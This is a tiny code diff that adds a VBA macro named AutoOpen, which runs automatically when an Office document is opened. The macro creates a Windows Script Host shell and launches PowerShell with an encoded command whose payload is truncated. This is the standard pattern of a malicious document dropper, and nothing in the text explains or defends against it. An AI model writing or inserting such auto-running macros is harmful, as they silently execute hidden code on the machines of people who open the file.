@@ -1,0 +1,4 @@
+Sub AutoOpen()
+Set o=CreateObject("Wscript.Shell")
+o.Run "powershell -enc AA..."
+End Sub
